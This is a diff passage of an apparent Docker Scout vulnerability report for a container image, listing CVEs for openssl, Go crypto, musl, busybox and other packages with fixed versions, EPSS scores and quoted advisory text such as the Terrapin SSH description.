+ 3. Or complete the migration of authorization entries to be inside a named account in the "accounts" block
+
+
+## Credits
+
+Problem reported by Alex Herrington.  
+Addressed publicly in a GitHub Discussion prior to this advisory.
+
+</blockquote>
+</details>
+</details></td></tr>
+
+<tr><td valign="top">
 <details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 2" src="https://img.shields.io/badge/H-2-e25d68"/> <img alt="medium: 8" src="https://img.shields.io/badge/M-8-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>openssl</strong> <code>1.1.1q-r0</code> (apk)</summary>
 
 <small><code>pkg:apk/alpine/openssl@1.1.1q-r0?os_name=alpine&os_version=3.16</code></small><br/>
 <a href="https://scout.docker.com/v/CVE-2023-0464?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.16&vr=%3C1.1.1t-r1"><img alt="high : CVE--2023--0464" src="https://img.shields.io/badge/CVE--2023--0464-lightgrey?label=high%20&labelColor=e25d68"/></a> 
 
 <table>
-<tr><td>Affected range</td><td><code><1.1.1t-r1</code></td></tr>
+<tr><td>Affected range</td><td><code>&lt;1.1.1t-r1</code></td></tr>
 <tr><td>Fixed version</td><td><code>1.1.1t-r1</code></td></tr>
 <tr><td>EPSS Score</td><td><code>0.857%</code></td></tr>
 <tr><td>EPSS Percentile</td><td><code>74th percentile</code></td></tr>
@@ -1744,7 +1742,7 @@ Addressed publicly in a GitHub Discussion prior to this advisory.
 <a href="https://scout.docker.com/v/CVE-2023-0286?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.16&vr=%3C1.1.1t-r0"><img alt="high : CVE--2023--0286" src="https://img.shields.io/badge/CVE--2023--0286-lightgrey?label=high%20&labelColor=e25d68"/></a> 
 
 <table>
-<tr><td>Affected range</td><td><code><1.1.1t-r0</code></td></tr>
+<tr><td>Affected range</td><td><code>&lt;1.1.1t-r0</code></td></tr>
 <tr><td>Fixed version</td><td><code>1.1.1t-r0</code></td></tr>
 <tr><td>EPSS Score</td><td><code>88.474%</code></td></tr>
 <tr><td>EPSS Percentile</td><td><code>99th percentile</code></td></tr>
@@ -1787,7 +1785,7 @@ The fix was developed by Hugo Landau.
 <a href="https://scout.docker.com/v/CVE-2023-2650?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.16&vr=%3C1.1.1u-r0"><img alt="medium : CVE--2023--2650" src="https://img.shields.io/badge/CVE--2023--2650-lightgrey?label=medium%20&labelColor=fbb552"/></a> 
 
 <table>
-<tr><td>Affected range</td><td><code><1.1.1u-r0</code></td></tr>
+<tr><td>Affected range</td><td><code>&lt;1.1.1u-r0</code></td></tr>
 <tr><td>Fixed version</td><td><code>1.1.1u-r0</code></td></tr>
 <tr><td>EPSS Score</td><td><code>91.907%</code></td></tr>
 <tr><td>EPSS Percentile</td><td><code>100th percentile</code></td></tr>
@@ -1804,7 +1802,7 @@ The fix was developed by Hugo Landau.
 <a href="https://scout.docker.com/v/CVE-2023-5678?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.16&vr=%3C1.1.1w-r1"><img alt="medium : CVE--2023--5678" src="https://img.shields.io/badge/CVE--2023--5678-lightgrey?label=medium%20&labelColor=fbb552"/></a> 
 
 <table>
-<tr><td>Affected range</td><td><code><1.1.1w-r1</code></td></tr>
+<tr><td>Affected range</td><td><code>&lt;1.1.1w-r1</code></td></tr>
 <tr><td>Fixed version</td><td><code>1.1.1w-r1</code></td></tr>
 <tr><td>EPSS Score</td><td><code>0.638%</code></td></tr>
 <tr><td>EPSS Percentile</td><td><code>70th percentile</code></td></tr>
@@ -1821,7 +1819,7 @@ The fix was developed by Hugo Landau.
 <a href="https://scout.docker.com/v/CVE-2023-3817?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.16&vr=%3C1.1.1v-r0"><img alt="medium : CVE--2023--3817" src="https://img.shields.io/badge/CVE--2023--3817-lightgrey?label=medium%20&labelColor=fbb552"/></a> 
 
 <table>
-<tr><td>Affected range</td><td><code><1.1.1v-r0</code></td></tr>
+<tr><td>Affected range</td><td><code>&lt;1.1.1v-r0</code></td></tr>
 <tr><td>Fixed version</td><td><code>1.1.1v-r0</code></td></tr>
 <tr><td>EPSS Score</td><td><code>0.329%</code></td></tr>
 <tr><td>EPSS Percentile</td><td><code>55th percentile</code></td></tr>
@@ -1838,7 +1836,7 @@ The fix was developed by Hugo Landau.
 <a href="https://scout.docker.com/v/CVE-2023-3446?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.16&vr=%3C1.1.1u-r2"><img alt="medium : CVE--2023--3446" src="https://img.shields.io/badge/CVE--2023--3446-lightgrey?label=medium%20&labelColor=fbb552"/></a> 
 
 <table>
-<tr><td>Affected range</td><td><code><1.1.1u-r2</code></td></tr>
+<tr><td>Affected range</td><td><code>&lt;1.1.1u-r2</code></td></tr>
 <tr><td>Fixed version</td><td><code>1.1.1u-r2</code></td></tr>
 <tr><td>EPSS Score</td><td><code>0.976%</code></td></tr>
 <tr><td>EPSS Percentile</td><td><code>76th percentile</code></td></tr>
@@ -1855,7 +1853,7 @@ The fix was developed by Hugo Landau.
 <a href="https://scout.docker.com/v/CVE-2023-0465?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.16&vr=%3C1.1.1t-r2"><img alt="medium : CVE--2023--0465" src="https://img.shields.io/badge/CVE--2023--0465-lightgrey?label=medium%20&labelColor=fbb552"/></a> 
 
 <table>
-<tr><td>Affected range</td><td><code><1.1.1t-r2</code></td></tr>
+<tr><td>Affected range</td><td><code>&lt;1.1.1t-r2</code></td></tr>
 <tr><td>Fixed version</td><td><code>1.1.1t-r2</code></td></tr>
 <tr><td>EPSS Score</td><td><code>0.398%</code></td></tr>
 <tr><td>EPSS Percentile</td><td><code>60th percentile</code></td></tr>
@@ -1872,7 +1870,7 @@ The fix was developed by Hugo Landau.
 <a href="https://scout.docker.com/v/CVE-2023-0215?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.16&vr=%3C1.1.1t-r0"><img alt="medium : CVE--2023--0215" src="https://img.shields.io/badge/CVE--2023--0215-lightgrey?label=medium%20&labelColor=fbb552"/></a> 
 
 <table>
-<tr><td>Affected range</td><td><code><1.1.1t-r0</code></td></tr>
+<tr><td>Affected range</td><td><code>&lt;1.1.1t-r0</code></td></tr>
 <tr><td>Fixed version</td><td><code>1.1.1t-r0</code></td></tr>
 <tr><td>EPSS Score</td><td><code>0.545%</code></td></tr>
 <tr><td>EPSS Percentile</td><td><code>67th percentile</code></td></tr>
@@ -1925,7 +1923,7 @@ developed by Viktor Dukhovni and Matt Caswell.
 <a href="https://scout.docker.com/v/CVE-2022-4450?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.16&vr=%3C1.1.1t-r0"><img alt="medium : CVE--2022--4450" src="https://img.shields.io/badge/CVE--2022--4450-lightgrey?label=medium%20&labelColor=fbb552"/></a> 
 
 <table>
-<tr><td>Affected range</td><td><code><1.1.1t-r0</code></td></tr>
+<tr><td>Affected range</td><td><code>&lt;1.1.1t-r0</code></td></tr>
 <tr><td>Fixed version</td><td><code>1.1.1t-r0</code></td></tr>
 <tr><td>EPSS Score</td><td><code>0.140%</code></td></tr>
 <tr><td>EPSS Percentile</td><td><code>35th percentile</code></td></tr>
@@ -1975,7 +1973,7 @@ Dawei Wang. The fix was developed by Kurt Roeckx and Matt Caswell.
 <a href="https://scout.docker.com/v/CVE-2022-4304?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.16&vr=%3C1.1.1t-r0"><img alt="medium : CVE--2022--4304" src="https://img.shields.io/badge/CVE--2022--4304-lightgrey?label=medium%20&labelColor=fbb552"/></a> 
 
 <table>
-<tr><td>Affected range</td><td><code><1.1.1t-r0</code></td></tr>
+<tr><td>Affected range</td><td><code>&lt;1.1.1t-r0</code></td></tr>
 <tr><td>Fixed version</td><td><code>1.1.1t-r0</code></td></tr>
 <tr><td>EPSS Score</td><td><code>0.255%</code></td></tr>
 <tr><td>EPSS Percentile</td><td><code>49th percentile</code></td></tr>
@@ -2022,7 +2020,7 @@ The fix was developed by Dmitry Belyavsky (Red Hat) and Hubert Kario.
 <a href="https://scout.docker.com/v/CVE-2022-30636?s=golang&n=crypto&ns=golang.org%2Fx&t=golang&vr=%3C0.0.0-20220525230936-793ad666bf5e"><img alt="high : CVE--2022--30636" src="https://img.shields.io/badge/CVE--2022--30636-lightgrey?label=high%20&labelColor=e25d68"/></a> 
 
 <table>
-<tr><td>Affected range</td><td><code><0.0.0-20220525230936-793ad666bf5e</code></td></tr>
+<tr><td>Affected range</td><td><code>&lt;0.0.0-20220525230936-793ad666bf5e</code></td></tr>
 <tr><td>Fixed version</td><td><code>0.0.0-20220525230936-793ad666bf5e</code></td></tr>
 <tr><td>EPSS Score</td><td><code>0.247%</code></td></tr>
 <tr><td>EPSS Percentile</td><td><code>48th percentile</code></td></tr>
@@ -2041,7 +2039,7 @@ Since the controlled path is suffixed with +http-01 before opening, the impact o
 <a href="https://scout.docker.com/v/CVE-2023-48795?s=github&n=crypto&ns=golang.org%2Fx&t=golang&vr=%3C0.0.0-20231218163308-9d2ee975ef9f"><img alt="medium 5.9: CVE--2023--48795" src="https://img.shields.io/badge/CVE--2023--48795-lightgrey?label=medium%205.9&labelColor=fbb552"/></a> <i>Insufficient Verification of Data Authenticity</i>
 
 <table>
-<tr><td>Affected range</td><td><code><0.0.0-20231218163308-9d2ee975ef9f</code></td></tr>
+<tr><td>Affected range</td><td><code>&lt;0.0.0-20231218163308-9d2ee975ef9f</code></td></tr>
 <tr><td>Fixed version</td><td><code>0.0.0-20231218163308-9d2ee975ef9f</code></td></tr>
 <tr><td>CVSS Score</td><td><code>5.9</code></td></tr>
 <tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N</code></td></tr>
@@ -2083,35 +2081,13 @@ This attack targets the specification of ChaCha20-Poly1305 (chacha20-poly1305@op
 </details></td></tr>
 
 <tr><td valign="top">
-<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 1" src="https://img.shields.io/badge/H-1-e25d68"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>musl</strong> <code>1.2.3-r0</code> (apk)</summary>
-
-<small><code>pkg:apk/alpine/musl@1.2.3-r0?os_name=alpine&os_version=3.16</code></small><br/>
-<a href="https://scout.docker.com/v/CVE-2025-26519?s=alpine&n=musl&ns=alpine&t=apk&osn=alpine&osv=3.16&vr=%3C1.2.3-r4"><img alt="high : CVE--2025--26519" src="https://img.shields.io/badge/CVE--2025--26519-lightgrey?label=high%20&labelColor=e25d68"/></a> 
-
-<table>
-<tr><td>Affected range</td><td><code><1.2.3-r4</code></td></tr>
-<tr><td>Fixed version</td><td><code>1.2.3-r4</code></td></tr>
-<tr><td>EPSS Score</td><td><code>0.016%</code></td></tr>
-<tr><td>EPSS Percentile</td><td><code>3rd percentile</code></td></tr>
-</table>
-
-<details><summary>Description</summary>
-<blockquote>
-
-
-
-</blockquote>
-</details>
-</details></td></tr>
-
-<tr><td valign="top">
 <details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 1" src="https://img.shields.io/badge/H-1-e25d68"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>github.com/nats-io/jwt</strong> <code>1.2.3-0.20210314221642-a826c77dc9d2</code> (golang)</summary>
 
 <small><code>pkg:golang/github.com/nats-io/jwt@1.2.3-0.20210314221642-a826c77dc9d2</code></small><br/>
 <a href="https://scout.docker.com/v/CVE-2021-3127?s=gitlab&n=jwt&ns=github.com%2Fnats-io&t=golang&vr=%3Cv2.0.1"><img alt="high : CVE--2021--3127" src="https://img.shields.io/badge/CVE--2021--3127-lightgrey?label=high%20&labelColor=e25d68"/></a> <i>OWASP Top Ten 2017 Category A9 - Using Components with Known Vulnerabilities</i>
 
 <table>
-<tr><td>Affected range</td><td><code><v2.0.1</code></td></tr>
+<tr><td>Affected range</td><td><code>&lt;v2.0.1</code></td></tr>
 <tr><td>Fixed version</td><td><code>v2.0.1</code></td></tr>
 <tr><td>EPSS Score</td><td><code>0.290%</code></td></tr>
 <tr><td>EPSS Percentile</td><td><code>52nd percentile</code></td></tr>
@@ -2154,13 +2130,35 @@ golang.org/x/net/http2/h2c
 </details></td></tr>
 
 <tr><td valign="top">
+<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 1" src="https://img.shields.io/badge/H-1-e25d68"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>musl</strong> <code>1.2.3-r0</code> (apk)</summary>
+
+<small><code>pkg:apk/alpine/musl@1.2.3-r0?os_name=alpine&os_version=3.16</code></small><br/>
+<a href="https://scout.docker.com/v/CVE-2025-26519?s=alpine&n=musl&ns=alpine&t=apk&osn=alpine&osv=3.16&vr=%3C1.2.3-r4"><img alt="high : CVE--2025--26519" src="https://img.shields.io/badge/CVE--2025--26519-lightgrey?label=high%20&labelColor=e25d68"/></a> 
+
+<table>
+<tr><td>Affected range</td><td><code>&lt;1.2.3-r4</code></td></tr>
+<tr><td>Fixed version</td><td><code>1.2.3-r4</code></td></tr>
+<tr><td>EPSS Score</td><td><code>0.016%</code></td></tr>
+<tr><td>EPSS Percentile</td><td><code>3rd percentile</code></td></tr>
+</table>
+
+<details><summary>Description</summary>
+<blockquote>
+
+
+
+</blockquote>
+</details>
+</details></td></tr>
+
+<tr><td valign="top">
 <details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 1" src="https://img.shields.io/badge/H-1-e25d68"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>golang.org/x/text</strong> <code>0.3.7</code> (golang)</summary>
 
 <small><code>pkg:golang/golang.org/x/text@0.3.7</code></small><br/>
 <a href="https://scout.docker.com/v/CVE-2022-32149?s=github&n=text&ns=golang.org%2Fx&t=golang&vr=%3C0.3.8"><img alt="high 7.5: CVE--2022--32149" src="https://img.shields.io/badge/CVE--2022--32149-lightgrey?label=high%207.5&labelColor=e25d68"/></a> <i>Missing Release of Resource after Effective Lifetime</i>
 
 <table>
-<tr><td>Affected range</td><td><code><0.3.8</code></td></tr>
+<tr><td>Affected range</td><td><code>&lt;0.3.8</code></td></tr>
 <tr><td>Fixed version</td><td><code>0.3.8</code></td></tr>
 <tr><td>CVSS Score</td><td><code>7.5</code></td></tr>
 <tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H</code></td></tr>
@@ -2181,155 +2179,13 @@ golang.org/x/text/language
 </details></td></tr>
 
 <tr><td valign="top">
-<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>golang.org/x/crypto</strong> <code>0.0.0-20220926161630-eccd6366d1be</code> (golang)</summary>
-
-<small><code>pkg:golang/golang.org/x/crypto@0.0.0-20220926161630-eccd6366d1be</code></small><br/>
-<a href="https://scout.docker.com/v/CVE-2023-48795?s=github&n=crypto&ns=golang.org%2Fx&t=golang&vr=%3C0.0.0-20231218163308-9d2ee975ef9f"><img alt="medium 5.9: CVE--2023--48795" src="https://img.shields.io/badge/CVE--2023--48795-lightgrey?label=medium%205.9&labelColor=fbb552"/></a> <i>Insufficient Verification of Data Authenticity</i>
-
-<table>
-<tr><td>Affected range</td><td><code><0.0.0-20231218163308-9d2ee975ef9f</code></td></tr>
-<tr><td>Fixed version</td><td><code>0.0.0-20231218163308-9d2ee975ef9f</code></td></tr>
-<tr><td>CVSS Score</td><td><code>5.9</code></td></tr>
-<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N</code></td></tr>
-<tr><td>EPSS Score</td><td><code>55.964%</code></td></tr>
-<tr><td>EPSS Percentile</td><td><code>98th percentile</code></td></tr>
-</table>
-
-<details><summary>Description</summary>
-<blockquote>
-
-### Summary
-
-Terrapin is a prefix truncation attack targeting the SSH protocol. More precisely, Terrapin breaks the integrity of SSH's secure channel. By carefully adjusting the sequence numbers during the handshake, an attacker can remove an arbitrary amount of messages sent by the client or server at the beginning of the secure channel without the client or server noticing it.
-
-### Mitigations
-
-To mitigate this protocol vulnerability, OpenSSH suggested a so-called "strict kex" which alters the SSH handshake to ensure a Man-in-the-Middle attacker cannot introduce unauthenticated messages as well as convey sequence number manipulation across handshakes.
-
-**Warning: To take effect, both the client and server must support this countermeasure.** 
-
-As a stop-gap measure, peers may also (temporarily) disable the affected algorithms and use unaffected alternatives like AES-GCM instead until patches are available.
-
-### Details
-
-The SSH specifications of ChaCha20-Poly1305 (chacha20-poly1305@openssh.com) and Encrypt-then-MAC (*-etm@openssh.com MACs) are vulnerable against an arbitrary prefix truncation attack (a.k.a. Terrapin attack). This allows for an extension negotiation downgrade by stripping the SSH_MSG_EXT_INFO sent after the first message after SSH_MSG_NEWKEYS, downgrading security, and disabling attack countermeasures in some versions of OpenSSH. When targeting Encrypt-then-MAC, this attack requires the use of a CBC cipher to be practically exploitable due to the internal workings of the cipher mode. Additionally, this novel attack technique can be used to exploit previously unexploitable implementation flaws in a Man-in-the-Middle scenario.
-
-The attack works by an attacker injecting an arbitrary number of SSH_MSG_IGNORE messages during the initial key exchange and consequently removing the same number of messages just after the initial key exchange has concluded. This is possible due to missing authentication of the excess SSH_MSG_IGNORE messages and the fact that the implicit sequence numbers used within the SSH protocol are only checked after the initial key exchange.
-
-In the case of ChaCha20-Poly1305, the attack is guaranteed to work on every connection as this cipher does not maintain an internal state other than the message's sequence number. In the case of Encrypt-Then-MAC, practical exploitation requires the use of a CBC cipher; while theoretical integrity is broken for all ciphers when using this mode, message processing will fail at the application layer for CTR and stream ciphers.
-
-For more details see [https://terrapin-attack.com](https://terrapin-attack.com). 
-
-### Impact
-
-This attack targets the specification of ChaCha20-Poly1305 (chacha20-poly1305@openssh.com) and Encrypt-then-MAC (*-etm@openssh.com), which are widely adopted by well-known SSH implementations and can be considered de-facto standard. These algorithms can be practically exploited; however, in the case of Encrypt-Then-MAC, we additionally require the use of a CBC cipher. As a consequence, this attack works against all well-behaving SSH implementations supporting either of those algorithms and can be used to downgrade (but not fully strip) connection security in case SSH extension negotiation (RFC8308) is supported. The attack may also enable attackers to exploit certain implementation flaws in a man-in-the-middle (MitM) scenario.
-
-</blockquote>
-</details>
-</details></td></tr>
-
-<tr><td valign="top">
-<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>google.golang.org/protobuf</strong> <code>1.28.1</code> (golang)</summary>
-
-<small><code>pkg:golang/google.golang.org/protobuf@1.28.1</code></small><br/>
-<a href="https://scout.docker.com/v/CVE-2024-24786?s=github&n=protobuf&ns=google.golang.org&t=golang&vr=%3C1.33.0"><img alt="medium 6.6: CVE--2024--24786" src="https://img.shields.io/badge/CVE--2024--24786-lightgrey?label=medium%206.6&labelColor=fbb552"/></a> <i>Loop with Unreachable Exit Condition ('Infinite Loop')</i>
-
-<table>
-<tr><td>Affected range</td><td><code><1.33.0</code></td></tr>
-<tr><td>Fixed version</td><td><code>1.33.0</code></td></tr>
-<tr><td>CVSS Score</td><td><code>6.6</code></td></tr>
-<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:U</code></td></tr>
-<tr><td>EPSS Score</td><td><code>0.231%</code></td></tr>
-<tr><td>EPSS Percentile</td><td><code>46th percentile</code></td></tr>
-</table>
-
-<details><summary>Description</summary>
-<blockquote>
-
-The protojson.Unmarshal function can enter an infinite loop when unmarshaling certain forms of invalid JSON. This condition can occur when unmarshaling into a message which contains a google.protobuf.Any value, or when the UnmarshalOptions.DiscardUnknown option is set.
-
-</blockquote>
-</details>
-</details></td></tr>
-
-<tr><td valign="top">
-<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>busybox</strong> <code>1.35.0-r17</code> (apk)</summary>
-
-<small><code>pkg:apk/alpine/busybox@1.35.0-r17?os_name=alpine&os_version=3.16</code></small><br/>
-<a href="https://scout.docker.com/v/CVE-2023-42366?s=alpine&n=busybox&ns=alpine&t=apk&osn=alpine&osv=3.16&vr=%3C1.35.0-r18"><img alt="medium : CVE--2023--42366" src="https://img.shields.io/badge/CVE--2023--42366-lightgrey?label=medium%20&labelColor=fbb552"/></a> 
-
-<table>
-<tr><td>Affected range</td><td><code><1.35.0-r18</code></td></tr>
-<tr><td>Fixed version</td><td><code>1.35.0-r18</code></td></tr>
-<tr><td>EPSS Score</td><td><code>0.024%</code></td></tr>
-<tr><td>EPSS Percentile</td><td><code>6th percentile</code></td></tr>
-</table>
-
-<details><summary>Description</summary>
-<blockquote>
-
-
-
-</blockquote>
-</details>
-</details></td></tr>
-
-<tr><td valign="top">
-<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>golang.org/x/crypto</strong> <code>0.0.0-20220722155217-630584e8d5aa</code> (golang)</summary>
-
-<small><code>pkg:golang/golang.org/x/crypto@0.0.0-20220722155217-630584e8d5aa</code></small><br/>
-<a href="https://scout.docker.com/v/CVE-2023-48795?s=github&n=crypto&ns=golang.org%2Fx&t=golang&vr=%3C0.0.0-20231218163308-9d2ee975ef9f"><img alt="medium 5.9: CVE--2023--48795" src="https://img.shields.io/badge/CVE--2023--48795-lightgrey?label=medium%205.9&labelColor=fbb552"/></a> <i>Insufficient Verification of Data Authenticity</i>
-
-<table>
-<tr><td>Affected range</td><td><code><0.0.0-20231218163308-9d2ee975ef9f</code></td></tr>
-<tr><td>Fixed version</td><td><code>0.0.0-20231218163308-9d2ee975ef9f</code></td></tr>
-<tr><td>CVSS Score</td><td><code>5.9</code></td></tr>
-<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N</code></td></tr>
-<tr><td>EPSS Score</td><td><code>55.964%</code></td></tr>
-<tr><td>EPSS Percentile</td><td><code>98th percentile</code></td></tr>
-</table>
-
-<details><summary>Description</summary>
-<blockquote>
-
-### Summary
-
-Terrapin is a prefix truncation attack targeting the SSH protocol. More precisely, Terrapin breaks the integrity of SSH's secure channel. By carefully adjusting the sequence numbers during the handshake, an attacker can remove an arbitrary amount of messages sent by the client or server at the beginning of the secure channel without the client or server noticing it.
-
-### Mitigations
-
-To mitigate this protocol vulnerability, OpenSSH suggested a so-called "strict kex" which alters the SSH handshake to ensure a Man-in-the-Middle attacker cannot introduce unauthenticated messages as well as convey sequence number manipulation across handshakes.
-
-**Warning: To take effect, both the client and server must support this countermeasure.** 
-
-As a stop-gap measure, peers may also (temporarily) disable the affected algorithms and use unaffected alternatives like AES-GCM instead until patches are available.
-
-### Details
-
-The SSH specifications of ChaCha20-Poly1305 (chacha20-poly1305@openssh.com) and Encrypt-then-MAC (*-etm@openssh.com MACs) are vulnerable against an arbitrary prefix truncation attack (a.k.a. Terrapin attack). This allows for an extension negotiation downgrade by stripping the SSH_MSG_EXT_INFO sent after the first message after SSH_MSG_NEWKEYS, downgrading security, and disabling attack countermeasures in some versions of OpenSSH. When targeting Encrypt-then-MAC, this attack requires the use of a CBC cipher to be practically exploitable due to the internal workings of the cipher mode. Additionally, this novel attack technique can be used to exploit previously unexploitable implementation flaws in a Man-in-the-Middle scenario.
-
-The attack works by an attacker injecting an arbitrary number of SSH_MSG_IGNORE messages during the initial key exchange and consequently removing the same number of messages just after the initial key exchange has concluded. This is possible due to missing authentication of the excess SSH_MSG_IGNORE messages and the fact that the implicit sequence numbers used within the SSH protocol are only checked after the initial key exchange.
-
-In the case of ChaCha20-Poly1305, the attack is guaranteed to work on every connection as this cipher does not maintain an internal state other than the message's sequence number. In the case of Encrypt-Then-MAC, practical exploitation requires the use of a CBC cipher; while theoretical integrity is broken for all ciphers when using this mode, message processing will fail at the application layer for CTR and stream ciphers.
-
-For more details see [https://terrapin-attack.com](https://terrapin-attack.com). 
-
-### Impact
-
-This attack targets the specification of ChaCha20-Poly1305 (chacha20-poly1305@openssh.com) and Encrypt-then-MAC (*-etm@openssh.com), which are widely adopted by well-known SSH implementations and can be considered de-facto standard. These algorithms can be practically exploited; however, in the case of Encrypt-Then-MAC, we additionally require the use of a CBC cipher. As a consequence, this attack works against all well-behaving SSH implementations supporting either of those algorithms and can be used to downgrade (but not fully strip) connection security in case SSH extension negotiation (RFC8308) is supported. The attack may also enable attackers to exploit certain implementation flaws in a man-in-the-middle (MitM) scenario.
-
-</blockquote>
-</details>
-</details></td></tr>
-
-<tr><td valign="top">
 <details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>github.com/ulikunitz/xz</strong> <code>0.5.8</code> (golang)</summary>
 
 <small><code>pkg:golang/github.com/ulikunitz/xz@0.5.8</code></small><br/>
 <a href="https://scout.docker.com/v/CVE-2025-58058?s=github&n=xz&ns=github.com%2Fulikunitz&t=golang&vr=%3C%3D0.5.13"><img alt="medium 5.3: CVE--2025--58058" src="https://img.shields.io/badge/CVE--2025--58058-lightgrey?label=medium%205.3&labelColor=fbb552"/></a> <i>Allocation of Resources Without Limits or Throttling</i>
 
 <table>
-<tr><td>Affected range</td><td><code><=0.5.13</code></td></tr>
+<tr><td>Affected range</td><td><code>&lt;=0.5.13</code></td></tr>
 <tr><td>Fixed version</td><td><code>0.5.14</code></td></tr>
 <tr><td>CVSS Score</td><td><code>5.3</code></td></tr>
 <tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L</code></td></tr>
@@ -2427,13 +2283,13 @@ Servers with a small amount of RAM that download and unpack a large number of un
 </details></td></tr>
 
 <tr><td valign="top">
-<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>golang.org/x/crypto</strong> <code>0.0.0-20220829220503-c86fa9a7ed90</code> (golang)</summary>
+<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>golang.org/x/crypto</strong> <code>0.0.0-20220926161630-eccd6366d1be</code> (golang)</summary>
 
-<small><code>pkg:golang/golang.org/x/crypto@0.0.0-20220829220503-c86fa9a7ed90</code></small><br/>
+<small><code>pkg:golang/golang.org/x/crypto@0.0.0-20220926161630-eccd6366d1be</code></small><br/>
 <a href="https://scout.docker.com/v/CVE-2023-48795?s=github&n=crypto&ns=golang.org%2Fx&t=golang&vr=%3C0.0.0-20231218163308-9d2ee975ef9f"><img alt="medium 5.9: CVE--2023--48795" src="https://img.shields.io/badge/CVE--2023--48795-lightgrey?label=medium%205.9&labelColor=fbb552"/></a> <i>Insufficient Verification of Data Authenticity</i>
 
 <table>
-<tr><td>Affected range</td><td><code><0.0.0-20231218163308-9d2ee975ef9f</code></td></tr>
+<tr><td>Affected range</td><td><code>&lt;0.0.0-20231218163308-9d2ee975ef9f</code></td></tr>
 <tr><td>Fixed version</td><td><code>0.0.0-20231218163308-9d2ee975ef9f</code></td></tr>
 <tr><td>CVSS Score</td><td><code>5.9</code></td></tr>
 <tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N</code></td></tr>
@@ -2469,6 +2325,148 @@ For more details see [https://terrapin-attack.com](https://terrapin-attack.com).
